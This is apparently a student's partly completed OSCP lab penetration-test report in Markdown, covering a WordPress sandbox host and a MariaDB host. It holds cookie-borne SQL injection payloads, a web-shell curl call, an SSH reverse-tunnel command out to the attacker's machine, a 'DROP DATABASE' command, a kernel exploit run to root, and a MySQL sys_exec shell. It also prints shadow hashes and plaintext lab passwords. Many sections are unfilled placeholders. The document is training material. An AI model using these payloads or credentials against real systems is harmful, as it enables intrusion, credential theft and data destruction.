---
title: "Offensive Security Certified Professional Excises Report"
author: ["chenglinkang1214@gmail.com", "OSID: OS-93614"]
date: "2020-07-25"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "OSCP Exam Report"
lang: "en"
titlepage: true
titlepage-color: "1E90FF"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Offensive Security OSCP Excises Report

## Introduction

The Offensive Security Exam penetration test report contains all efforts that were conducted in order to pass the Offensive Security exam.
This report will be graded from a standpoint of correctness and fullness to all aspects of the exam.
The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the Offensive Security Certified Professional.

## Objective

The objective of this assessment is to perform an internal penetration test against the Offensive Security Exam network.
The student is tasked with following methodical approach in obtaining access to the objective goals.
This test should simulate an actual penetration test and how you would start from beginning to end, including the overall report.
An example page has already been created for you at the latter portions of this document that should give you ample information on what is expected to pass this course.
Use the sample report as a guideline to get you through the reporting.

## Requirements

The student will be required to fill out this penetration testing report fully and to include the following sections:

- Overall High-Level Summary and Recommendations (non-technical)
- Methodology walkthrough and detailed outline of steps taken
- Each finding with included screenshots, walkthrough, sample code, and proof.txt if applicable
- Any additional items that were not included

# High-Level Summary

I was tasked with performing an internal penetration test towards Offensive Security Exam.
An internal penetration test is a dedicated attack against internally connected systems.
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Offensive Security's internal exam systems - the THINC.local domain.
My overall objective was to evaluate the network, identify systems, and exploit flaws while reporting the findings back to Offensive Security.

When performing the internal penetration test, there were several alarming vulnerabilities that were identified on Offensive Security's network.
When performing the attacks, I was able to gain access to multiple machines, primarily due to outdated patches and poor security configurations.
During the testing, I had administrative level access to multiple systems.
All systems were successfully exploited and access granted.
These systems as well as a brief description on how access was obtained are listed below:

- 10.11.1.250 (ajla) - Name of initial exploit
- 10.5.5.11 () - Name of initial exploit
- 192.168.xx.xx (hostname) - Name of initial exploit
- 192.168.xx.xx (hostname) - Name of initial exploit
- 192.168.xx.xx (hostname) - BOF

## Recommendations

I recommend patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.

# Methodologies

I utilized a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Exam environments is secured.
Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Information Gathering

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, I was tasked with exploiting the exam network.
The specific IP addresses were:

**Exam Network**

- 10.11.1.250 (sandbox.local)
- 192.168.
- 192.168.
- 192.168.
- 192.168.

## Penetration

The penetration testing portions of the assessment focus heavily on gaining access to a variety of systems.
During this penetration test, I was able to successfully gain access to **X** out of the **X** systems.

---
### System IP: 10.11.1.250

#### Service Enumeration

The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems.
This is valuable for an attacker as it provides detailed information on potential attack vectors into a system.
Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test.
In some cases, some ports may not be listed.

Server IP Address | Ports Open
------------------|----------------------------------------
10.11.1.250       | **TCP**: 80

**dir enum**
  - apache 2.4.18 port 80 */wp-content/uploads*
  - WordPress directory location	*/var/www/html*
  - Uploads directory location	*/var/www/html/wp-content/uploads*
  - Themes directory location	*/var/www/html/wp-content/themes*
  - Plugins directory location	*/var/www/html/wp-content/plugins*

**wpscan**
  - WordPress theme in use: oceanwp version 1.7.1
  - elementor 3.4.7
  - ocean-extra 1.8.3
  - wp-survey-and-poll 1.6.1

**searchploit**
  - wp-survey-and-poll
  - 
**UDP**: 1434,161

**Server architecture**
  - Linux 4.4.0-21-generic x86_64
  - Web server	Apache/2.4.18 (Ubuntu)
  - PHP version	7.0.33-0ubuntu0.16.04.7 (Supports 64bit values)
  - WordPress version 5.3
  - uname -a
    - Linux ajla 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux

**Nmap Scan Results:**

*Initial Shell Vulnerability Exploited*

*Additional info about where the initial shell was acquired from*

**Vulnerability Explanation:**
   - **Exploit Title:** Wordpress Plugin Survey & Poll 1.5.7.3 'sss_params' SQL Injection: https://www.exploit-db.com/exploits/45411


**Vulnerability Fix:**

**Severity:**

**Proof of Concept Code Here:**
- Step 2. When you answer the question, wp_sap will be assigned to a value. Open a cookie manager, and change it with the payload showed below;

```
["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,@@version,11#"]
```
  
```
["1650149780')) OR 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9,table_name,11 FROM information_schema.tables#"]
```

```
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,column_name,11 FROM information_schema.columns WHERE table_name='wp_users'#"]
```

```
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_login,11 FROM wp_users#"]
```

```
["1650149780')) OR 1=2 UNION SELECT 1,2,3,4,5,6,7,8,9,user_pass,11 FROM wp_users#"]
```

**Local.txt Proof Screenshot**
- TODO
**Local.txt Contents**
- Table 'wp_users' **user_login** **user_pass**
```
var sss_params = {[\"user_login\"],[\"user_pass\"],[\"user_nicename\"],[\"user_email\"],[\"user_url\"],[\"user_registered\"],[\"user_activation_key\"],[\"user_status\"],[\"display_name\"]]}"};
```

- Username **wp_ajla_admin**
```
var sss_params = {\"survey_id\":\"1550849657\",\"style\":\"modal\",\"expired\":\"false\",\"debug\":\"true\",\"questions\":[[\"Are you enjoying the new site?\",\"Yes\",\"No\"],[\"wp_ajla_admin\"]]}"};
```
- Password **!love29jan2006!**

```
var sss_params = {\"survey_id\":\"1550849657\",\"style\":\"modal\",\"expired\":\"false\",\"debug\":\"true\",\"questions\":[[\"Are you enjoying the new site?\",\"Yes\",\"No\"],[\"$P$BfBIi66MsPQgzmvYsUzwjc5vSx9L6i\\\/\"]]}"};
```

- whoami **www-data**

```
curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami
```

- wp-config.php: found DB **username** and **passwd**.
    ```
    // ** MySQL settings - You can get this info from your web host ** //
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress' );

    /** MySQL database username */
    define( 'DB_USER', 'wp' );

    /** MySQL database password */
    define( 'DB_PASSWORD', 'Lv9EVQq86cfi8ioWsqFUQyU' );

    /** MySQL hostname */
    define( 'DB_HOST', '10.5.5.11' );
    ```

---
#### Privilege Escalation

- Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation: https://www.exploit-db.com/papers/45010

**Vulnerability Exploited:**

**Vulnerability Explanation:**

It is possible to bypass the bpf verifier (verifier.c), load bpf code, and create a read/write primitive. The root cause of this vulnerability is improper arithmetic/sign-extention in the 'check_alu_op()' function located within verifier.c. The improper arithmetic makes it possible for sign extension to occur in either of the following cases:

**Vulnerability Fix:**

**Severity:**
 7.8 HIGH 

**Exploit Code:**
  [*] creating bpf map
  [*] sneaking evil bpf past the verifier
  [*] creating socketpair()
  [*] attaching bpf backdoor to socket
  [*] skbuff => ffff880038c3f500  
  [*] Leaking sock struct from ffff88003af5e180
  [*] Sock->sk_rcvtimeo at offset 472
  [*] Cred structure at ffff880038704600
  [*] UID from cred structure: 1000, matches the current: 1000
  [*] hammering cred structure at ffff880038704600
  [*] credentials patched, launching shell...
  #id
  uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(internet)

**Proof Screenshot Here:**

**Proof.txt Contents:**
```
cat proof.txt
5e584c86f32741226abdf0dd3356e4dc
```
---
## Notes
- http://sandbox.local/wp-includes/
- http://sandbox.local/wp-admin/

- IP `192.168.119.215`
- ifconfig
    ```
    ens160    Link encap:Ethernet  HWaddr 00:50:56:bf:89:f8  
            inet addr:**10.4.4.10**  Bcast:**10.4.4.255**  Mask:255
    ```
    ```
    hostname
    **ajla**
    ```
    ```
    cat /etc/issue	
    **Ubuntu 16.04** LTS \n \l

    cat /proc/version
    Linux version **4.4.0-21-generic** (buildd@lgw01-21) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016
    ```
- ~/.ssh/authorized_keys
    ```
    from="10.11.1.250",command="echo 'This account can only be used for port forwarding'", no-agent-forwarding,no-X11-forwarding,no-pty ssh-ras ssh-ras
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGcmUq7G1jVw94u0mFXVOWeJtPfYVlbAztdl9nwVmiMgc+6bQ1HfGb5P6F4BJbipD52fxmRzfzeyOYrdr8Aceyw6eivkqNLZFq5mC6347/ApMozaPlIYORyFxsDkDLd8vcuNJhbrj6K4XsAxM/59QgwcJkMiE7rbGPh0gEx+yuwyR1vaCfDa1h542mfmdXnu2I6zF7gLe/+XWfdq9uZj7J8BOZTp0vHrg0cfkbmot7hapnGuVZmrWwuSsyP5ZHgG/qobEQdN1k54vGfrmQBR8pt6bLWIvhCb7TucNufa8P2OoF9EE00ep07iDhbUwCNvdJu+kSfwT4GrBRsvyU+Zzn www-data@ajla
    ```
- ssh command on the WordPress Host
    ```
    ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.119.215
    ```
- cat /etc/passwd
```
root:x:0:0:root:/root:/bin/bash
ajla:x:1000:1000:service,,,:/home/ajla:/bin/bash
```
- cat /etc/shadow
```
SHA-256
root:$6$L.DEQk09$DhGD609Wq5aZf0GQPMZYOqiIxxyUwvVBnahArgD.yoVgoxeQeNn3R.JbL0HcmsU1lT1oCrciYlGkfatyobKJH0:18249:0:99999:7:::

ajla:$6$OLfdLDQT$7Q2mzNaQEudRSaHZck3P165EI3OVlgdCwPXrUyiNmItYb7fc/z5RvPc.4VeMgsGMq1H7Wl3HH/dUP2ELRjc2t1:18184:0:99999:7:::
```

- john --wordlist=/usr/share/wordlists/rockyou.txt root_pass.txt
```
0g 0:00:00:40 1.91% (ETA: 08:31:38) 0g/s 8010p/s 8010c/s 8010C/s 99alero..8147020
0g 0:00:00:41 1.96% (ETA: 08:31:39) 0g/s 8009p/s 8009c/s 8009C/s xkirstyx..werehere
0g 0:00:06:54 21.85% (ETA: 08:28:21) 0g/s 8051p/s 8051c/s 8051C/s td6053011..tctwins
0g 0:00:07:37 24.31% (ETA: 08:28:06) 0g/s 8035p/s 8035c/s 8035C/s smsm2536..smrmary15
0g 0:00:16:20 53.95% (ETA: 08:27:03) 0g/s 7964p/s 7964c/s 7964C/s gouch99..gottagun
0g 0:00:30:17 DONE (2021-11-14 08:27) 0g/s 7893p/s 7893c/s 7893C/s !!!playboy!!!7..*7¡Vamos!
```

- 
    
## Difficulties
- Can't run the uploaded plugin. Got 404 with `http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami`
  - Need to revert the sandbox.
    - To revert 10.11.1.250, please revert 10.4.4.10 and 10.5.5.11 in the "Sandbox" tab in the Control Panel.
  - The curl command missing `.php` after plugin-shell. The correct command:
    - `curl http://sandbox.local/wp-content/plugins/plugin-shell/plugin-shell.php?cmd=whoami`
- can't find password for `ssh root@sandbox.local`
- can't find mysql credentials for mysql in /var/log/apache2/access.log
  - `mysql -u root -pBmDu9xUHKe3fZi3Z7RdMBeb -h 10.5.5.11 -e 'DROP DATABASE wordpress;'`
- ssh connection refused
```
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa kali@192.168.119.215
Warning: Identity file /tmp/keys/id_rsa not accessible: No such file or directory.
ssh: connect to host 192.168.119.215 port 22: Connection refused
```
  - Fix: start ssh service
    - `service ssh start`
    - `netstat -tupln | grep -i ssh`

## Thoughts
- use PHP reverse shell `/usr/share/webshells/php/
php-reverse-shell.php`
- For the mysql database credential enum, can search `mysql` with grep.

---
---

### System IP: 10.5.5.11

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
10.5.5.11         | **TCP**: 22, 3306\
**UDP**: 1434,161

**Nmap Scan Results:**
- `sudo nmap -sC -sS -Pn -p0-65535 10.5.5.11` 
  - port 22 is open - ssh
  - port 3306 is open - mysql
  
**Database infos**  
  - Extension	mysqli
  - Server version	10.3.20-MariaDB
  - Client version	mysqlnd 5.0.12-dev - 20150407 - $Id: b5c5906d452ec590732a93b051f3827e02749b83 $
  - Database user	**wp**
  - Database host	**10.5.5.11**

**Vulnerability Explanation:**
Enum in in 10.11.1.250
**Vulnerability Fix:**
NULL
**Severity:**
NULL
**Proof of Concept Code Here:**
- In 10.11.1.250, run `cat wp-config.php`

**Local.txt Proof Screenshot**

**Local.txt Contents**
- wp-config.php: found DB **username** and **passwd**.
    ```
    // ** MySQL settings - You can get this info from your web host ** //
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress' );

    /** MySQL database username */
    define( 'DB_USER', 'wp' );

    /** MySQL database password */
    define( 'DB_PASSWORD', 'Lv9EVQq86cfi8ioWsqFUQyU' );

    /** MySQL hostname */
    define( 'DB_HOST', '10.5.5.11' );
    ```

- DB: show variables;
  - `cat ./tmp/mysql-show-variables.txt| grep dir`
    - hostname **zora** 
    - basedir	**/usr**
    - character_sets_dir	**/usr/share/mariadb/charsets/**
    - datadir	**/var/lib/mysql/**
    - plugin_dir	**/home/dev/plugin/**
    - slave_load_tmpdir	**/var/tmp**
    - wsrep_data_home_dir	**/var/lib/mysql/**
  - `cat ./tmp/mysql-show-variables.txt| grep version`
    - innodb_version	10.3.20
    - version	10.3.20-MariaDB
    - version_comment	MariaDB Server
    - version_compile_machine	x86_64
    - version_ssl_library	OpenSSL 1.1.1d  10 Sep 2019
    - wsrep_patch_version	wsrep_25.24

- shell via mysql db `select sys_exec('./shell.elf');`
```
uname -a
Linux zora 4.19.78-0-virt #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019 x86_64 Linux

cat /etc/alpine-release
3.10.2

cat /proc/version
Linux version 4.19.78-0-virt (buildozer@build-3-10-x86_64) (gcc version 8.3.0 (Alpine 8.3.0)) #1-Alpine SMP Thu Oct 10 15:25:30 UTC 2019

env
USER=mysql
SHLVL=1
HOME=/var/lib/mysql
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin
LANG=C
PWD=/var/lib/mysql

cat /etc/fstab
UUID=ede2f74e-f23a-441c-b9cb-156494837ef3	/	ext4	rw,relatime 0 1
UUID=8e53ca17-9437-4f54-953c-0093ce5066f2	/boot	ext4	rw,relatime 0 2
UUID=ed8db3c1-a3c8-45fb-b5ec-f8e1529a8046	swap	swap	defaults	0 0
/dev/cdrom	/media/cdrom	iso9660	noauto,ro 0 0
/dev/usbdisk	/media/usb	vfat	noauto	0 0
cd//10.5.5.20/Scripts    /mnt/scripts    cifs    uid=0,gid=0,username=,password=,_netdev 0 0

cd /mnt/scripts
cat system_report.ps1
cat system_report.ps1
# find a better way to automate this
$username = "sandbox\alex"
$pwdTxt = "Ndawc*nRoqkC+haZ"
ComputerName = "POULTRY"

```


#### Privilege Escalation

*Additional Priv Esc info*

**Vulnerability Exploited:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Exploit Code:**

**Proof Screenshot Here:**

**Proof.txt Contents:**

---
## Tips
- MySQL enum
  - Export the output of `show variables;` to a file would make search easier.
  - `mysql --host=127.0.0.1 --port=13306 --user=wp -p -e"show variables;" >./tmp/mysql-show-variables.txt`

## Difficulties
- When run `make` in `lib_mysqludf_sys`, got `fatal error: m_ctype.h: No such file or directory`
  - Need to install libs
    - `sudo apt update && sudo apt install default-libmysqlclient-dev default-libmysqld-dev`
  - Change the `Makefile` to the following, Make sure you have m_ctype.h as the very first include.
```
LIBDIR=/usr/lib

install:
	gcc -fPIC -Wall -I/usr/include/mariadb/server -I/usr/include/mariadb/ -I/usr/include/mariadb/server/private -I. -shared lib_mysqludf_sys.c -o $(LIBDIR)/lib_mysqludf_sys.so
```

---
---
### System IP: 10.

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
192.168.x.x       | **TCP**: 1433,3389\
**UDP**: 1434,161

**Nmap Scan Results:**

*Initial Shell Vulnerability Exploited*

*Additional info about where the initial shell was acquired from*

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Proof of Concept Code Here:**

**Local.txt Proof Screenshot**

**Local.txt Contents**

#### Privilege Escalation

*Additional Priv Esc info*

**Vulnerability Exploited:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Exploit Code:**

**Proof Screenshot Here:**

**Proof.txt Contents:**

### System IP: 192.168.x.x

#### Service Enumeration

Server IP Address | Ports Open
------------------|----------------------------------------
192.168.x.x       | **TCP**: 1433,3389\
**UDP**: 1434,161

**Nmap Scan Results:**

*Initial Shell Vulnerability Exploited*

*Additional info about where the initial shell was acquired from*

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Proof of Concept Code Here:**

**Local.txt Proof Screenshot**

**Local.txt Contents**

#### Privilege Escalation

*Additional Priv Esc info*

**Vulnerability Exploited:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Exploit Code:**

**Proof Screenshot Here:**

**Proof.txt Contents:**

### System IP: 192.168.x.x

**Vulnerability Exploited: bof**

Fill out this section with BOF NOTES.

**Proof Screenshot:**

**Completed Buffer Overflow Code:**

Please see Appendix 1 for the complete Windows Buffer Overflow code.

## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, I removed all user accounts and passwords as well as the Meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

# Additional Items

## Appendix - Proof and Local Contents:

IP (Hostname) | Local.txt Contents | Proof.txt Contents
--------------|--------------------|-------------------
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here

## Appendix - Metasploit/Meterpreter Usage

For the exam, I used my Metasploit/Meterpreter allowance on the following machine: `192.168.x.x`

## Appendix - Completed Buffer Overflow Code

```
code here
```
